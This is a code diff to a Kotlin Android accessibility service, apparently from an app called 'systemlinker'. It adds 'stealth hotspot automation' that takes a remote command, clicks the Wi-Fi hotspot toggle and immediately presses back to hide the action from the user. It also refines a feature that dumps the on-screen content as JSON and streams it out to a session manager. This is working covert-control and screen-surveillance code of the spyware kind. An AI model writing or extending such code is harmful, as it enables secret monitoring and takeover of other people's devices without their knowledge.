@@ -6,7 +6,6 @@ import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
-import android.provider.Settings
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import org.json.JSONArray
@@ -16,7 +15,11 @@ class SystemAccessibility : AccessibilityService() {
 
     private var isStreamingScreen = false
     private var lastDumpTime = 0L
-    private val DUMP_INTERVAL_MS = 500L // 2 fps max
+    private val DUMP_INTERVAL_MS = 500L
+
+    // State trackers for stealth hotspot automation
+    private var isAutomatingHotspot = false
+    private var hotspotAutomationStartTime = 0L
 
     private val commandReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
@@ -27,17 +30,22 @@ class SystemAccessibility : AccessibilityService() {
                 "stream_screen_start" -> isStreamingScreen = true
                 "stream_screen_stop" -> isStreamingScreen = false
                 "toggle_hotspot" -> {
-                    // --- ERROR-PROOF FIX ---
-                    // ACTION_TETHER_SETTINGS is hidden in the public SDK. 
-                    // We use the exact internal AOSP string to bypass compiler errors.
+                    // Activate automation state and start timeout timer
+                    isAutomatingHotspot = true
+                    hotspotAutomationStartTime = System.currentTimeMillis()
+                    
                     try {
-                        val settingsIntent = Intent("android.settings.TETHER_SETTINGS")
-                        settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                        // Attempt standard direct entry point
+                        val settingsIntent = Intent().apply {
+                            setClassName("com.android.settings", "com.android.settings.TetherSettings")
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                        }
                         this@SystemAccessibility.startActivity(settingsIntent)
                     } catch (e: Exception) {
-                        // Fallback to Wireless Settings if the OEM removed the direct tether page
-                        val fallbackIntent = Intent(Settings.ACTION_WIRELESS_SETTINGS)
-                        fallbackIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                        // Fallback entry point
+                        val fallbackIntent = Intent("android.settings.TETHER_SETTINGS").apply {
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                        }
                         this@SystemAccessibility.startActivity(fallbackIntent)
                     }
                 }
@@ -63,33 +71,46 @@ class SystemAccessibility : AccessibilityService() {
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-        if (event?.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
-            event.className?.toString()?.contains("com.android.settings") == true) {
-            
+        // --- 1. HOTSPOT AUTOMATION LOGIC ---
+        if (isAutomatingHotspot) {
+            // Failsafe: If automation takes more than 4 seconds, abort and close to prevent being stuck
+            if (System.currentTimeMillis() - hotspotAutomationStartTime > 4000) {
+                isAutomatingHotspot = false
+                performGlobalAction(GLOBAL_ACTION_BACK)
+                return
+            }
+
             val rootNode = rootInActiveWindow ?: return
             
-            // Try to find the hotspot toggle switch. Text may vary by Android version/OEM.
-            val hotspotKeywords = listOf("Wi-Fi hotspot", "Use WiFi hotspot", "Tethering & portable hotspot", "Portable hotspot")
-            var hotspotToggleNode: AccessibilityNodeInfo? = null
+            // Comprehensive list of strings used by different OEMs for the Hotspot toggle
+            val keywords = listOf("Wi-Fi hotspot", "Use Wi-Fi hotspot", "Portable hotspot", "Tethering")
+            var clicked = false
 
-            for (keyword in hotspotKeywords) {
+            for (keyword in keywords) {
                 val nodes = rootNode.findAccessibilityNodeInfosByText(keyword)
                 if (nodes.isNotEmpty()) {
-                    hotspotToggleNode = findClickableParent(nodes.first())
-                    break
+                    val clickableNode = findClickableParent(nodes.first())
+                    if (clickableNode != null) {
+                        clickableNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                        clicked = true
+                    }
                 }
+                nodes.forEach { it.recycle() }
+                if (clicked) break
             }
 
-            if (hotspotToggleNode != null) {
-                hotspotToggleNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                // Immediately go back to hide the action from the user
-                Thread.sleep(300) // small delay to ensure click registers
+            // If we successfully clicked the toggle, wait 250ms and instantly press back to hide it
+            if (clicked) {
+                isAutomatingHotspot = false
+                Thread.sleep(250)
                 performGlobalAction(GLOBAL_ACTION_BACK)
             }
+            
             rootNode.recycle()
-            return // Stop further processing for this event
+            return // Skip screen streaming logic while automating
         }
-        
+
+        // --- 2. SCREEN STREAMING LOGIC ---
         if (!isStreamingScreen) return
         
         val currentTime = System.currentTimeMillis()
@@ -105,9 +126,11 @@ class SystemAccessibility : AccessibilityService() {
             put("data", screenData)
         }
         
-        // Broadcast back to LiveSessionManager
-        val broadcast = Intent("com.systemlinker.SCREEN_DATA")
-        broadcast.putExtra("json", jsonPayload.toString())
+        val broadcast = Intent("com.systemlinker.SCREEN_DATA").apply {
+            // Also explicitly routing the screen data back to the manager
+            setPackage(applicationContext.packageName)
+            putExtra("json", jsonPayload.toString())
+        }
         sendBroadcast(broadcast)
     }
     
@@ -117,9 +140,11 @@ class SystemAccessibility : AccessibilityService() {
             if (currentNode.isClickable) {
                 return currentNode
             }
-            currentNode = currentNode.parent
+            val parent = currentNode.parent
+            if (currentNode != node) currentNode.recycle()
+            currentNode = parent
         }
-        return null // return original node if no clickable parent found
+        return null
     }
 
     private fun dumpNode(node: AccessibilityNodeInfo): JSONObject {
